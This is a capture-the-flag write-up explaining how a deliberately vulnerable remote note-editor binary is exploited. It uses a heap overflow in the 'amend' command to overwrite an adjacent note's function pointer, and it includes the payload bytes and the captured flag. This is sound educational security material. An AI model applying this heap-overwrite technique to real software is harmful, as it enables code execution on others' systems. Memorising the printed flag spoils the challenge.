# The Apparatus, Manifestation

**Exploitation · Wave 8 · 145 pts (capstone)**

Remote note editor over `nc`. 8 slots, menu: inscribe / erase / read aloud /
amend / depart. An off-menu `manifest_flag` prints the flag. The MOTD even
leaks its address: `0x401266`. Binary is **no-PIE, no stack canary**, glibc 2.31.

## Structure

Each note is a 24-byte struct `{char *data; size_t size; void(*read_fn)(note*)}`.
`read_fn` is set to the read-aloud routine (`0x401212`) at creation. Notes live
in a global array at `0x404060`. Allocation order is contiguous:
`structA, dataA, structB, dataB`.

Key behaviors from the disassembly:

- **Erase** frees data + struct but **does not null** `notes[idx]` (UAF — the
  "some things do not stay gone" hint).
- **Read aloud** does `call notes[idx]->read_fn` — a function-pointer call.
- **Amend** does `fread(notes[idx]->data, 1, newsize, stdin)` with `newsize`
  up to `0xf0` and **no check** against the buffer's real size → linear heap
  overflow.

## Exploit

Amending note 0 (a 24-byte body) with a 56-byte payload runs `dataA` straight
into `structB`, overwriting note 1's `read_fn` (at offset +0x30 from `dataA`)
with `manifest_flag`:

```
payload  = b'A'*0x10        # filler (dataA)
payload += b'B'*0x08        # structB prev_size
payload += p64(0x21)        # structB chunk size
payload += p64(0)           # structB->data (ignored by win fn)
payload += p64(0)           # structB->size
payload += p64(0x401266)    # structB->read_fn = manifest_flag
```

Then **read aloud note 1** → `call 0x401266` → flag. `manifest_flag` ignores its
argument, so the clobbered `data` pointer doesn't matter.

Remote needs a session token first (an inetd-style wrapper; the bare binary has
no token gate, which is how the mechanics were tested locally in Docker).

## Flag

```
POCTF{126.2050.C5O7HDBLJUDYFY4G.QOM3S7LGGDVME5RYTE4XRXMNG7}
```

## Lesson

No-PIE handed us the win address; the MOTD gift-wrapped it. The unbounded
`amend` is a plain overflow — struct-before-data layout means one note's body
reaches into the next note's function pointer. (The dangling-pointer UAF is a
second route.)
